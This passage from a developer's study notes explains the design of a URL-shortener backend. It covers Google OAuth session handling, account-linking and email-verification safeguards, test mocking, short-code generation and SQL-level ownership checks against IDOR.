token. `requireAuth` (`src/middleware/auth.ts`) verifies it exactly the
same way regardless of how the user originally authenticated — it has no
code path that even knows OAuth exists.

**Where it lives in the codebase.** `findOrCreateOAuthUser` in
`src/services/authService.ts`, reusing `signToken` from
`src/services/tokenService.ts`; the callback route in
`src/routes/auth.ts` redirects with `?token=` — this project's session
token, never `tokens.id_token` or `tokens.access_token` from Google.

**Common pitfalls.**

- Forwarding Google's `id_token` to the frontend as if it were a session
  token — it wasn't issued for that purpose, its expiry/lifetime is
  controlled by Google (not tunable via this app's `JWT_EXPIRES_IN`), and
  every route that checks it would need Google-specific verification
  logic instead of the one `verifyToken` this app already has.
- Storing Google's access/refresh tokens "just in case a future feature
  needs them" — this phase never calls a Google API on the user's
  behalf, so there's nothing to refresh or store; adding that machinery
  speculatively is exactly the kind of scope creep this phase avoids.

**Production considerations.** Because both auth paths converge on the
same `signToken`/`verifyToken`, any future session-related change
(rotation, shorter expiry, a revocation list) is written once and
automatically covers both password and OAuth users — there's no second
"OAuth session" system to keep in sync.

**Interview answer.** Google's tokens describe a relationship with
Google — an access token scoped to Google's APIs, an identity token
whose validity Google controls. Neither maps to "is this a valid Click
Scope session." So after verifying the Google identity, I sign our own
JWT the exact same way `signup`/`login` already do, and nothing
downstream — `requireAuth`, `GET /me` — has any idea whether a given
token came from a password or a Google login. One session mechanism,
regardless of how the user originally authenticated.

---

### The redirect handoff: why the JWT goes in the URL fragment, not a query string

**What it is.** The callback's final redirect carries our JWT as
`${FRONTEND_URL}#token=...` — a URL fragment — not
`${FRONTEND_URL}?token=...`, a query string. This was a late correction:
the first version of this phase used a query string, on the reasoning
that it matched the `token` field name `signup`/`login` already return
in their JSON bodies. That reasoning missed a real difference between
the two cases — a JSON body isn't logged by intermediaries the way a
request URL is — and a security review of the diff caught it.

**Why it exists in this project.** A query string is part of the actual
HTTP request line the browser sends. That means it can end up in: this
server's own access logs, any reverse proxy or CDN sitting in front of
it, and the `Referer` header of any _subsequent_ outbound request the
landing page makes (an analytics beacon, a font/CDN fetch, an ad
script) — none of which should ever see a live bearer token for this
app's session. A URL fragment (everything after `#`) is fundamentally
different: it's a client-side-only construct. Browsers never include it
in the request line sent to a server, so none of those log/Referer
leakage paths apply to it at all.

**How it works mechanically.** `res.redirect(\`${config.FRONTEND_URL}#token=${encodeURIComponent(token)}\`)`— from the server's perspective this looks almost identical to the
query-string version, but the browser treats everything after`#`specially: it's available to client-side JavaScript via`window.location.hash`, but is stripped before the browser ever
constructs the actual GET request line for that navigation (and for any
same-origin requests the page subsequently makes, since fragments aren't
part of what gets echoed into `Referer`either). The frontend (out of
scope for this phase, but worth stating for whoever builds it) should
read`window.location.hash`once, then immediately call`history.replaceState(null, '', window.location.pathname)` to scrub the
token out of the visible URL and browser history entry — the fragment
approach avoids _transmission_ leakage, not persistence in history.

**Where it lives in the codebase.** The final `res.redirect(...)` in the
`/google/callback` handler, `src/routes/auth.ts`. The `?error=oauth_denied`
redirect for denied consent, by contrast, deliberately stays a query
string — it carries no secret, and query strings are the conventional,
bookmarkable, log-safe place for a non-sensitive status indicator.

**Common pitfalls.**

- Reusing a JSON-response field name/shape as justification for a URL
  parameter without re-checking the actual transmission path — a value
  that's safe inside a JSON body (never logged verbatim by default, not
  part of any URL) is not automatically safe as a URL query parameter,
  which travels through a completely different set of intermediaries.
- Treating the fragment switch as a complete fix — it closes the
  server-side/log/Referer leakage path specifically, but the token still
  lands in browser history once the frontend has read it, until the
  frontend explicitly scrubs the URL with `history.replaceState`.

**Production considerations.** Two more robust alternatives exist for
when the frontend is actually built (out of this phase's scope, which is
API-only, no frontend): setting the JWT as an `HttpOnly`, `Secure`,
`SameSite=Lax` cookie directly in the redirect response (eliminates
client-side JS exposure entirely, but requires the API and frontend to
share a registrable domain or accept cross-site cookie complexity), or
redirecting with a short-lived, single-use _exchange code_ that the
frontend immediately POSTs to a dedicated token-exchange endpoint
(keeps the real JWT out of any URL at all, at the cost of one more
endpoint and one more round trip). Both are meaningfully bigger design
decisions — cookie domain/CORS implications, or new API surface — than
this phase's fix, which only needed to close the log/Referer leakage
path for now.

**Interview answer.** I initially put the JWT in a query string,
matching the field name `signup`/`login` already return in JSON — but a
query string is part of the actual request line, so it ends up in
server access logs, proxy/CDN logs, and potentially a `Referer` header
if the landing page makes any outbound request afterward. A URL
fragment never gets sent to a server at all — browsers strip it before
constructing the request line — so moving the token there closes that
specific leakage path. It's not a complete fix on its own: the token
still sits in browser history until the frontend scrubs it with
`history.replaceState`, and a cookie-based session or a one-time
exchange-code endpoint would remove the URL-based transmission
entirely — reasonable next steps once there's an actual frontend to
build against.

---

### Account linking: the takeover vulnerability, the email_verified claim, and the rejection policy

**What it is.** The policy decision in `findOrCreateOAuthUser`: if a
Google login's email matches an _existing password account_, reject with
409 rather than silently attaching the Google identity to that account
("auto-linking").

**Why it exists in this project.** Auto-linking by email is a real
account-takeover vector. Consider: a victim signs up for Click Scope
with `victim@example.com` and a password, but never verifies that email
(if this app ever adds email verification) — or more simply, consider
any system where email ownership isn't cryptographically tied to the
account. An attacker who does not own `victim@example.com` can still
often create a _Google_ account using that same address as a recovery/
contact email, or — more directly relevant here — if this app ever
trusted an _unverified_ email claim from any provider, an attacker could
register anywhere with `victim@example.com` and get auto-linked into the
victim's existing account, gaining full access to it. The
`email_verified` claim in Google's `id_token` is what would make
auto-linking _conditionally_ safe: Google only sets it `true` after
Google itself confirmed the user controls that mailbox (via Google's own
signup/verification flow), so an auto-link gated strictly on
`email_verified === true` is a meaningfully different, much safer claim
than "an email string matches." This phase's policy is simpler still:
reject the match entirely, regardless of `email_verified`, rather than
build and reason carefully about a conditional auto-link now.

**How it works mechanically.** In `findOrCreateOAuthUser`, the
`(oauth_provider, oauth_id)` lookup runs _first_; if it misses, a second
lookup by `lower(email)` checks for a password account. A hit there is
necessarily a password account (an OAuth match would have already
returned above), so it throws `conflict('An account with this email
already exists — sign in with your password')` — a 409 — and creates no
row. The `users_password_xor_oauth_check` constraint (Phase 2) is never
touched or relaxed; this policy is enforced in application logic, one
layer above a schema that was never asked to allow the ambiguous case in
the first place.

**Where it lives in the codebase.** `src/services/authService.ts`,
`findOrCreateOAuthUser`'s second `SELECT`; the callback route in
`src/routes/auth.ts` propagates the thrown `AppError` as a raw 409 JSON
response (not a redirect — see the "handling denied consent" subsection
below for the contrast).

**Common pitfalls.**

- Auto-linking on _any_ email match without checking `email_verified` —
  this is the exact takeover vector described above; even a
  conditional auto-link needs that claim as its gate, and this phase
  chose not to build the conditional version at all yet.
- Silently merging accounts instead of rejecting — from the legitimate
  password-account owner's perspective, a silent merge is
  indistinguishable from an attacker successfully taking over their
  account, even when it happens to be the "real" Google-owning user
  triggering it. Rejecting with a clear message keeps that ambiguity out
  of the system entirely.

**Production considerations — the UX cost.** A real user who signed up
with a password and later tries "Sign in with Google" using the same
email hits a 409, not a seamless merge — they have to remember they
already have a password account and use it instead. That's a genuine
rough edge for a small fraction of returning users, traded deliberately
for never having a linking bug be exploitable. The route currently
surfaces this 409 as raw JSON rather than a `FRONTEND_URL?error=...`
redirect (see the next subsection's contrast with denied-consent
handling) — a real deployment would likely want to catch this
specific `AppError` in the callback and redirect with an error indicator
instead, giving the frontend something to render a helpful message from,
rather than dropping the user on an API's bare JSON response mid-navigation.

**Interview answer.** Auto-linking a new OAuth login to an existing
account just because the email string matches is an account-takeover
vector — an attacker who can get any provider to hand them a token
claiming a victim's email would be silently merged into the victim's
account. The `email_verified` claim is what makes a conditional version
of auto-linking safe, because it means the _provider_ already confirmed
mailbox ownership, not just that a string matches. For this phase I
chose to reject the match outright rather than build that conditional
path — a password-account owner trying Google sign-in gets a clear 409
telling them to use their password, at the cost of a rougher experience
for that specific case, in exchange for not having to reason carefully
about a linking feature's edge cases before it's actually needed.

---

### Rejecting unverified emails: closing the account-squatting gap

**What it is.** `findOrCreateOAuthUser` throws `badRequest('Google
account email is not verified')` if `emailVerified` is `false`, before
running either of its two `SELECT`s or its `INSERT` — a check added
after the initial implementation, once a security review pointed out the
account-linking rejection policy above only covers _linking to an
existing account_, not _creating a new one_.

**Why it exists in this project.** The account-linking subsection above
explains why `email_verified` is the gate that makes _linking_ safe —
but the same claim matters just as much for plain account _creation_,
for a different reason: `users_email_lower_unique_idx` (Phase 2) makes
email globally unique across every user, OAuth or password. If this
function created an OAuth account for an email Google itself hasn't
verified, an attacker could squat on someone else's real email address —
say, one Google lets you add as an unverified contact/recovery address
without proving ownership — and that row would then permanently occupy
this app's unique-email slot for that address. The real owner, trying to
sign up later with a password, would hit the same 409 "email already
exists" this app uses for a legitimate duplicate — except there's no
legitimate account to point them to, only an attacker's OAuth account
they never created and can't access. Rejecting unverified emails outright
means every row this app ever creates for an email address corresponds
to someone Google itself has confirmed controls that mailbox.

**How it works mechanically.** The check is the very first line inside
`findOrCreateOAuthUser`, before even the `(oauth_provider, oauth_id)`
lookup — so an unverified identity is rejected without a single query
running, not just before the `INSERT`. This is stricter than "only check
before creating a new row": it also means a _returning_ OAuth user would
be rejected on a login where Google's response reports `email_verified:
false`, which in practice shouldn't happen for an account that was
already created (creation itself now requires `true`), but keeps the
invariant absolute rather than conditional on which branch of the
function is about to run.

**Where it lives in the codebase.** The `if (!emailVerified) throw
badRequest(...)` guard at the top of `findOrCreateOAuthUser`,
`src/services/authService.ts`. Covered by
`tests/services/authService.test.ts` (asserts 400 and zero rows created)
and `tests/routes/googleAuth.test.ts` (same assertion through the full
HTTP callback).

**Common pitfalls.**

- Checking `email_verified` only at the account-_linking_ branch (the
  email-collision `SELECT`) and assuming that's sufficient — it isn't;
  the squatting risk exists purely from _creating_ a row, with no
  existing account required for an attacker to cause harm.
- Defaulting `emailVerified` to `true` anywhere upstream "to keep things
  simple" — `oauthService.ts`'s `exchangeCodeForIdentity` already
  defaults a missing claim to `false` (the safe direction), and this
  check is what makes that default actually matter.

**Production considerations.** This makes Google's `email_verified`
claim a hard requirement for using this app via Google sign-in at all —
a small number of real Google accounts may have an unverified primary
email in unusual configurations (e.g. certain legacy or enterprise
setups), and those users would see a 400 with no path forward via OAuth.
That's an accepted tradeoff for this phase: correctness of the unique-
email invariant over accommodating every possible Google account
configuration.

**Interview answer.** The account-linking rejection policy stops an
attacker from attaching an unverified Google identity to someone else's
_existing_ password account, but that alone doesn't stop them from
_creating_ a brand-new account with someone else's unverified email —
which would squat on this app's globally-unique email slot and lock the
real owner out of ever signing up with their own address. So
`findOrCreateOAuthUser` now rejects any Google identity with
`email_verified: false` outright, before running a single query — every
row this app creates corresponds to an email Google has actually
confirmed the user controls.

---

### Find-or-create ordering: provider identity first, email second

**What it is.** `findOrCreateOAuthUser` looks up
`(oauth_provider, oauth_id)` before it ever looks at `email` — the order
matters, not just the fact that both checks exist.

**Why it exists in this project.** Google's `sub` claim (the OAuth
subject id) is documented as stable and never reused — "a Google account
can have multiple emails at different points in time, but the sub value
is never changed" (per Google's own token payload docs). Email is not
stable: a user can change the email address on their Google account at
any time. If this app keyed OAuth users on email instead, a user who
changes their Google email would look, on their next login, like a
brand-new person — either creating a duplicate account (losing access to
their links/history under the old identity) or, worse, silently landing
on whatever _other_ account currently holds that new email string,
depending on how such a system were built. Keying on `(provider,
oauth_id)` first sidesteps both failure modes: the _same_ Google account
is always recognized as the same Click Scope user, regardless of what
email it currently reports.

**How it works mechanically.** `SELECT ... WHERE oauth_provider = $1
AND oauth_id = $2` runs first and, on a hit, returns immediately — the
`email` argument for that call isn't even consulted once a
provider-identity match is found (deliberately: this function doesn't
sync the stored email to a changed Google email either, which is a
separate policy decision left out of scope for this phase). Only on a
miss does the function fall through to the email-collision check
described in the account-linking subsection above.

**Where it lives in the codebase.**
`src/services/authService.ts`, `findOrCreateOAuthUser`'s first `SELECT`
(the identity lookup) versus its second `SELECT` (the collision check).
The `users_oauth_identity_unique` constraint
(`UNIQUE(oauth_provider, oauth_id)`, Phase 2) is what makes this lookup
meaningful as an identity key at the database level, not just in
application logic.

**Common pitfalls.**

- Looking up by email first "because it's simpler" — this silently
  reintroduces the email-instability bug this ordering exists to avoid,
  even if both checks are eventually present.
- Assuming `provider` alone is enough — `oauth_id` (Google's `sub`) is
  only unique _within_ a provider; the composite `(provider, oauth_id)`
  is the actual identity key, which is why `users_oauth_identity_unique`
  is a two-column constraint, not a unique index on `oauth_id` alone.

**Production considerations.** If a second OAuth provider is ever added,
this ordering pattern (provider-identity lookup first, email-collision
check second, only on a miss) is the one to repeat — not a redesign.

**Interview answer.** I look up OAuth users by `(provider, oauth_id)`
before ever touching email, because Google's `sub` claim is guaranteed
stable while email isn't — a user can change their Google email at any
time. Keying on email first would mean a user who changes their email
either gets treated as a new signup, losing their existing account, or
in a worse design, lands on whatever account currently owns that new
email string. The provider's subject id is the actual identity; email is
just contact information that happens to also be useful for detecting a
collision with a _different_ signup method, which is a separate check
run only when the identity lookup misses.

---

### How Phase 2's password_hash XOR constraint already accommodated OAuth users

**What it is.** `findOrCreateOAuthUser` needed no migration — `users`
already had `oauth_provider`, `oauth_id`, a nullable `password_hash`, the
`users_oauth_identity_unique` constraint, and
`users_password_xor_oauth_check`, all added in Phase 2, well before this
phase's OAuth logic existed.

**Why it exists in this project.** Phase 2's schema design anticipated
exactly this: "a user must authenticate via exactly one method... never
both, never neither" (Notes.md Phase 2). That XOR was written as a
general rule about the shape of a valid row, not as a rule specific to
password auth — so when this phase needed to add a second authentication
method, the schema had already made room for it.

**How it works mechanically.** `findOrCreateOAuthUser`'s `INSERT`
statement lists `(email, oauth_provider, oauth_id, email_verified)` and
never mentions `password_hash` — the column simply stays at its default
(`NULL`) by omission, the same way `signup`'s `INSERT` lists
`(email, password_hash)` and never mentions `oauth_provider`/`oauth_id`,
leaving those `NULL`. Both inserts satisfy the XOR constraint by
construction — neither function has to check or enforce the rule
itself, because there's no code path in either one capable of setting
both sets of columns at once.

**Where it lives in the codebase.**
`migrations/20260810111606772_create-users-table.ts` (unmodified by this
phase — confirmed via `git diff migrations/`);
`src/services/authService.ts`'s `signup` and `findOrCreateOAuthUser`,
whose `INSERT` column lists are each other's complement.

**Common pitfalls.**

- Assuming a new authentication method always needs a schema change —
  it doesn't, if (as here) the schema was already designed around "one
  of several methods" rather than "the one method that currently
  exists."
- Writing an `INSERT` that explicitly sets `password_hash = NULL` for an
  OAuth user instead of simply omitting the column — functionally
  identical (the column defaults to `NULL` either way), but omission
  makes the two `INSERT` statements' _shapes_ visibly mirror the XOR
  rule itself; explicitly writing `NULL` obscures that symmetry for a
  future reader.

**Production considerations.** If a third authentication method is ever
added (a third-party SSO, a magic-link flow), the XOR constraint as
written (`password_hash` vs. `oauth_provider`/`oauth_id` as two mutually
exclusive branches) would need to become a genuine "exactly one of N"
rule, or more likely be redesigned around a separate `auth_methods`
table — two branches hardcoded into one `CHECK` doesn't generalize
cleanly past two methods.

**Interview answer.** This phase needed zero migrations, because Phase 2
designed the `users` table around "exactly one authentication method,"
not around password auth specifically — the OAuth columns, their unique
constraint, and the XOR check were all already there. `signup` and
`findOrCreateOAuthUser` satisfy that constraint by construction: each
`INSERT` only ever mentions the columns for its own method and leaves
the other method's columns at their `NULL` default, so there's no code
path in either function that could even attempt to violate the rule.

---

### Handling denied consent and provider errors as expected outcomes, not server errors

**What it is.** When a user clicks "Cancel" on Google's consent screen,
Google redirects back with `?error=access_denied` (and no `code`) rather
than failing to redirect at all. The callback handler checks for this
_after_ validating `state` but _before_ attempting anything that assumes
a `code` exists, and responds with a redirect, not a thrown `AppError`.

**Why it exists in this project.** A user declining to sign in with
Google is a completely normal, expected branch of this flow — not a bug,
not an attack, not a reason to log a server error or return a 5xx/
generic-4xx. Treating it as an error would be both semantically wrong
(nothing failed; the user made a choice) and bad UX (a raw JSON error
body instead of landing back on the app).

**How it works mechanically.** The callback's query schema
(`googleCallbackQuerySchema` in `src/routes/auth.ts`) makes `code` and
`error` both optional — Google sends exactly one of them, never both.
After `state` is validated (first, unconditionally — see the state
parameter subsection for why this ordering matters even here), the
handler checks `if (error)` and, if present, logs it at `warn` level
(`req.log.warn({ error }, ...)`, never at `error` level — this isn't a
server fault) and redirects to `FRONTEND_URL?error=oauth_denied` without
touching `exchangeCodeForIdentity` or `findOrCreateOAuthUser` at all. A
subsequent `if (!code)` catches the one remaining edge case — a
callback with neither `error` nor `code`, which shouldn't happen from
Google itself but is still handled explicitly (400) rather than left to
crash on a `null` code further down.

**Where it lives in the codebase.** The `if (error)` / `if (!code)`
branches in the `/google/callback` handler, `src/routes/auth.ts`,
positioned after `consumeState` and before `exchangeCodeForIdentity`.

**Common pitfalls.**

- Checking `error` before `state` — this project deliberately validates
  `state` first, so a forged callback URL carrying
  `error=access_denied` and no valid state is rejected with 400 rather
  than being treated as "the real user politely declined."
- Logging denied consent at `error` severity — it pollutes error
  dashboards/alerting with an entirely normal, frequent user action;
  `warn` (or even `info`) is the appropriate level.
- Forgetting the "neither `error` nor `code`" case — an easy gap to miss
  since it's not something Google itself produces, but defensive
  handling here is cheap and avoids a confusing crash if it ever does
  happen (a proxy stripping a query param, a malformed manual request).

**Production considerations.** `?error=oauth_denied` on the frontend
redirect is a generic indicator, not Google's raw `error` value passed
through verbatim — deliberately: Google's error codes aren't meant for
end-user display, and passing them through unfiltered would require the
frontend to handle an open-ended, Google-controlled vocabulary instead
of one stable value this API defines.

**Interview answer.** A user declining Google's consent screen is a
normal outcome, so the callback treats `?error=access_denied` as a
redirect back to the frontend with an indicator, not a thrown error —
logged at `warn`, not `error`, since nothing actually failed. The
ordering matters: state is validated before `error` is ever inspected,
so an attacker can't forge a callback claiming "denied" to sneak past
without a valid state. And a callback with neither `code` nor `error` —
not something Google itself sends, but reachable by a hand-crafted
request — still gets an explicit 400 rather than falling through to a
crash.

---

### Testing an external OAuth provider without hitting the real API

**What it is.** The three-layer test strategy this phase uses instead of
calling real Google endpoints: `nock` intercepts the one real outbound
HTTP call (`getToken`'s POST to Google's token endpoint); `verifyIdToken`
is stubbed directly with `vi.spyOn`, returning a canned `LoginTicket`;
everything else (state lifecycle, the callback route's own logic,
`findOrCreateOAuthUser`) runs against this project's real local
Postgres/Redis, exactly like every other test in this codebase.

**Why it exists in this project.** This is the first genuine external-
network dependency in the test suite — every other test hits a real
_local_ instance of its dependency (Postgres, Redis), which this project
can spin up in Docker Compose; there is no equivalent "real local
Google." Hitting the actual Google API from tests would be slow, flaky
in CI, and explicitly out of scope for this phase.

**How it works mechanically.** `tests/services/oauthService.test.ts`
uses `nock('https://oauth2.googleapis.com').post('/token').reply(...)`
to fake Google's token response, and
`vi.spyOn(OAuth2Client.prototype, 'verifyIdToken')` to fake the verified-
identity result — constructed as a real `LoginTicket` instance (from
`google-auth-library` itself) carrying a hand-built `TokenPayload`, not
an ad hoc object shape. Critically, one test asserts
`expect(spy).toHaveBeenCalledWith(expect.objectContaining({ idToken:
'fake-id-token', audience: clientId }))` — because `verifyIdToken` is
fully stubbed, every _other_ test in the file would still pass even if
the real code stopped passing the correct `audience`; the mock returns
its canned payload regardless of what it's called with. That one
assertion is what stands between "we call `verifyIdToken` correctly" and
a silent regression. `tests/routes/googleAuth.test.ts` mocks only
`exchangeCodeForIdentity` (via `vi.mock` with `importOriginal`, so
`buildGoogleAuthUrl` — pure string-building, no network — still runs
for real), letting the callback route's own logic (state validation,
error handling, find-or-create, the redirect) be exercised end-to-end
against real Redis and Postgres.

**Where it lives in the codebase.**
`tests/lib/oauthState.test.ts` (state lifecycle, real Redis);
`tests/services/oauthService.test.ts` (nock + `vi.spyOn`, including the
audience-assertion test); `tests/services/authService.test.ts`'s
`findOrCreateOAuthUser` describe block (pure DB, no mocking);
`tests/routes/googleAuth.test.ts` (supertest + `vi.mock`, real DB/Redis).

**Common pitfalls.**

- Mocking a verification call's _output_ without ever asserting its
  _input_ — see the audience-assertion point above; this is the specific
  gap flagged during this phase's planning, not a hypothetical.
- Mocking more than necessary — `buildGoogleAuthUrl` is pure and
  network-free, so mocking it too (rather than letting the `/google`
  route test exercise the real thing) would hide a real bug in URL
  construction behind a fake.
- Assuming a green test suite here proves Google-side integration works
  — it doesn't, and the next subsection is explicit about that gap.

**Production considerations — the residual gap.** Signature verification
_correctness itself_ — does `verifyIdToken` actually reject a forged
token, an expired one, one with the wrong audience — is trusted entirely
to `google-auth-library`'s own test suite, not exercised by this
project's. This project's tests only prove two things: that our code
calls `verifyIdToken` with the right arguments, and that our code
handles its output correctly. They cannot catch a bug _inside_ the
library. In a system where that residual risk mattered more — handling
financial transactions, or a security-sensitive multi-tenant boundary —
the right mitigation wouldn't be hand-rolling JWKS verification in-house
just to make it testable; it would be adding a small number of
integration tests that run against Google's _real_ token endpoint in CI,
using a real, low-privilege test Google Cloud OAuth client, kept on a
separate, slower CI tier from the fast mocked unit suite — specifically
to catch the case where a `google-auth-library` upgrade or a config
change silently breaks real-world verification in a way no mock could
reveal.

**Interview answer.** I mock the one real network call (`nock` on
Google's token endpoint) and stub `verifyIdToken`'s return value
directly, rather than hitting the real Google API from tests. The
important detail is that mocking `verifyIdToken`'s _output_ alone leaves
a blind spot — since the mock returns the same canned result regardless
of input, a regression that broke the `audience` argument would pass
silently — so I added a test asserting `verifyIdToken` is _called with_
our `GOOGLE_CLIENT_ID`. Even so, this test suite can't prove Google's own
signature-verification logic is correct — that's trusted to the
library's own tests. If that residual risk mattered more, the fix
wouldn't be hand-rolling JWKS verification to make it "testable" —
it'd be a slower, separate CI tier of integration tests against Google's
real endpoint with a disposable test OAuth client.

---

## Phase 6: Link Management

### New dependency: nanoid

**What it is.** `nanoid` is a tiny, dependency-free ID generator. Its
default export produces a URL-safe random string from a CSPRNG;
`customAlphabet(alphabet, length)` — the part actually used here — builds
a generator constrained to a specific character set and length instead of
nanoid's own default alphabet/size.

**Why it exists in this project.** A link needs a short, unpredictable
identifier: short so `clickscope.io/<code>` is actually shorter than the
original URL, unpredictable so an attacker can't guess or enumerate
other users' short codes and land on private destinations. Neither
requirement is satisfied by what's already in the codebase —
`crypto.randomUUID()` (zero new dependency) produces a 36-character
string, far too long for a "short" link; hand-rolling a generator on top
of `Math.random()` would be short but not unpredictable (see the CSPRNG
section below for why that matters concretely). `nanoid` is the smallest
addition that's both short and cryptographically unpredictable.

**How it works mechanically.** `src/lib/shortCode.ts` calls
`customAlphabet(ALPHABET, DEFAULT_SHORT_CODE_LENGTH)` once at module load
to build a reusable generator function, then `generateShortCode()` just
invokes it. Under the hood, `customAlphabet` pulls raw bytes from
Node's `crypto.randomBytes` (a CSPRNG, see below) and maps them onto the
given alphabet via rejection sampling, so every character of the output
is uniformly distributed across the 62-character set — no character is
subtly more likely than another the way a naive `bytes % 62` mapping
would produce.

**Where it lives in the codebase.** `src/lib/shortCode.ts`
(`generateShortCode`, `ALPHABET`, `DEFAULT_SHORT_CODE_LENGTH`); the
`nanoid` entry in `package.json` `dependencies`.

**Common pitfalls.**

- Reaching for `Math.random()` because it's already there and "it's just
  an ID, not a password" — the whole point of Phase 4's CSPRNG-vs-`Math.random()`
  reasoning for tokens applies just as much to an identifier that gates
  access to a resource.
- Using nanoid's _default_ alphabet (which includes `-` and `_`) instead
  of `customAlphabet` with an explicit set — this project's alphabet is a
  deliberate, separate decision from "whatever nanoid ships with", see
  the alias-charset discussion below.

**Production considerations.** None beyond what's already true of any
small, actively-maintained dependency: pin a specific major version
(`^5.1.16`, not the just-released `6.x`) rather than being an early
adopter of a security-relevant package's major bump, and keep an eye on
its changelog for CSPRNG-relevant fixes.

**Interview answer.** I added `nanoid` for short-code generation because
it wraps Node's CSPRNG (`crypto.randomBytes`) instead of `Math.random()`,
which matters for an identifier that gates access to a link's
destination — a predictable generator would let an attacker guess or
enumerate other users' codes. I considered `crypto.randomUUID()` (already
available, no new dependency) but a UUID's 36 characters defeats the
point of a "short" link, and a hand-rolled `Math.random()` generator
would be short but not unpredictable.

---

### Authentication vs. authorization

**What it is.** Authentication answers "who is making this request?" —
in this app, verifying a JWT and extracting the `sub` claim as
`req.userId`. Authorization answers a different question: "is this
specific, authenticated identity allowed to do this specific thing to
this specific resource?" The two are independent axes — a request can be
perfectly authenticated (a valid, unexpired token for a real user) and
still not authorized (that user doesn't own the link they're asking to
delete).

**Why it exists in this project.** Every route through Phase 5 only
needed authentication: `GET /api/auth/me` returns _the caller's own_
data by construction (it reads `req.userId`, there's no other id
involved). Link routes are the first place a request names a resource
that might belong to someone else — `GET /api/links/:id` takes an `id`
from the URL that has no necessary relationship to `req.userId` at all.
Proving the token is valid says nothing about whether _this_ token's
owner is allowed to see _that_ particular row.

**How it works mechanically.** `requireAuth` (unchanged from Phase 4)
handles authentication only — it populates `req.userId` and nothing
else; it has no idea what resource the request is about. Authorization
is a second, separate step that happens inside `linkService`'s query
layer, on every single function: `getLink`, `updateLink`, and
`deleteLink` all take `(userId, linkId)` and fold both into one SQL
`WHERE` clause (see the next section for exactly how). Authentication
answers "whose request is this", authorization is enforced by literally
constraining what data that identity's queries can touch.

**Where it lives in the codebase.** Authentication:
`src/middleware/auth.ts` (`requireAuth`). Authorization:
`src/services/linkService.ts` — every exported function that takes a
`linkId` also takes and uses a `userId`.

**Common pitfalls.**

- Treating "the route is behind `requireAuth`" as sufficient security for
  a per-resource action — `requireAuth` proves identity, not permission;
  every route in `src/routes/links.ts` needs both.
- Checking authorization in the route/controller layer with an
  `if (link.userId !== req.userId)` after an unscoped fetch — technically
  achieves the same _result_ as this phase's approach in the common case,
  but is structurally weaker; see the next section for why.

**Production considerations.** At larger scale this often grows into a
dedicated authorization layer (policy objects, an ACL table, a rules
engine) once resources have more than one owner-and-owner-only shape —
e.g. shared/team links, read-only collaborators. Nothing in this phase
needs that yet: single-owner resources with a `user_id` foreign key are
the simplest case, and the SQL-scoping pattern below is proportionate to
that simplicity.

**Interview answer.** Authentication proves who's asking; authorization
decides what they're allowed to touch. `requireAuth` handles the first
and stops there — it just puts a user id on the request. The second is a
separate concern this phase introduces for the first time in this
codebase, because it's the first phase where an authenticated request can
name a resource — a link id — that doesn't inherently belong to the
caller. I enforce it in the query layer itself rather than as a
post-fetch check, which the next section covers in detail.

---

### Object-level authorization enforced in SQL vs. a post-fetch `if`

**What it is.** Two ways to implement "only let a user act on their own
resource." Approach A: fetch the resource by its id alone, then compare
`resource.userId === req.userId` in application code, and reject if not.
Approach B: bake the ownership condition directly into the query that
fetches (or updates, or deletes) the resource — `WHERE id = $1 AND
user_id = $2` — so a row belonging to someone else is never returned to
the application layer in the first place.

**Why it exists in this project.** `linkService.ts` uses approach B
everywhere. The reason isn't stylistic — it's that approach A has a
structural weakness approach B doesn't: it depends on every single call
site remembering to write, and correctly write, the `if` check. Add a
new route, a new internal helper, a future admin endpoint reusing
`getLink` — any one of those can forget the check, or get the comparison
backwards (`!==` vs `===` is a classic typo), and the bug is silent:
requests just start succeeding for the wrong user. Approach B makes that
category of mistake structurally impossible, because there is no code
path where an unscoped row ever exists in memory to leak.

**How it works mechanically.** Every function in `src/services/linkService.ts`
that touches an existing row takes `(userId, linkId)` and puts both into
one WHERE clause:

```ts
export async function getLink(userId: string, linkId: string): Promise<Link | null> {
  const result = await query<LinkRow>(
    `SELECT ${LINK_COLUMNS} FROM links WHERE id = $1 AND user_id = $2`,
    [linkId, userId],
  );
  const row = result.rows[0];
  return row ? toLink(row) : null;
}
```

`updateLink` and `deleteLink` do the same — the `WHERE` clause on the
`UPDATE`/`DELETE` statement itself is the check, not a separate `SELECT`
followed by a comparison. Postgres either finds a matching row (this
user, this link) or it doesn't; there is no third state where a row
exists but the query "found" it and then application code has to decide
whether to hand it back.

**Where it lives in the codebase.** `src/services/linkService.ts` —
`getLink`, `updateLink`, `deleteLink`, and `listLinks` (which scopes by
`user_id` alone, no specific `linkId`) all follow this pattern.

**Common pitfalls.**

- The single most common real-world version of this bug: `SELECT * FROM
links WHERE id = $1`, then `if (link.user_id !== req.userId) throw
forbidden()` — works fine until someone adds a second call site to the
  unscoped fetch and forgets the check, or a refactor moves the check
  above the fetch instead of after it.
- Believing input validation (checking `id` is a well-formed UUID) has
  anything to do with authorization — a syntactically valid UUID that
  belongs to another user is a perfectly valid _request_, just not an
  authorized one. Validation and authorization are separate concerns
  addressed by separate mechanisms in this codebase (Zod for the former,
  the SQL WHERE clause for the latter).

**Production considerations.** This exact pattern is the right level of
solution for single-owner, foreign-key-scoped resources. It stops
generalizing once a resource can have multiple legitimate viewers with
different permission levels (owner can delete, collaborator can only
read) — that needs an explicit permissions table or policy layer, not
more WHERE clauses. Postgres Row-Level Security (`CREATE POLICY`) is
another production option for enforcing this at the database layer
itself, so even a buggy or compromised application-layer query can't
bypass it — worth knowing about, not adopted here since a single
`WHERE user_id = $2` clause per query already gives the same guarantee
at this scale without RLS's operational complexity (every connection
needs the right session variable set correctly, migrations get trickier).

**Interview answer.** I fold the ownership check into the query itself —
`WHERE id = $1 AND user_id = $2` — rather than fetching by id alone and
comparing in application code afterward. The difference matters because
the post-fetch `if` check depends on every call site remembering to
write it correctly; forget it once, in one new route or helper function,
and that's a silent authorization bypass. Scoping it in the query makes
that class of bug impossible to introduce by omission — there's no code
path where an unscoped row is ever in memory to accidentally return.

---

### Broken access control as an OWASP vulnerability class

**What it is.** "Broken Access Control" is OWASP's top-ranked web
application risk category (A01:2021 in the OWASP Top 10) — access
control failures where an authenticated user can act on data or
functionality they shouldn't be able to reach. The specific shape
relevant here is **IDOR** (Insecure Direct Object Reference): an
endpoint takes an identifier — a URL id, a query param — directly from
the client and uses it to fetch a resource without verifying the caller
actually owns or has permission to access that specific object.

**Why it exists in this project.** `GET /api/links/:id` is a textbook
IDOR shape: it takes `id` straight from the URL. Without the SQL-scoping
from the previous section, any authenticated user could enumerate UUIDs
(or, more realistically, obtain one link id legitimately and then try
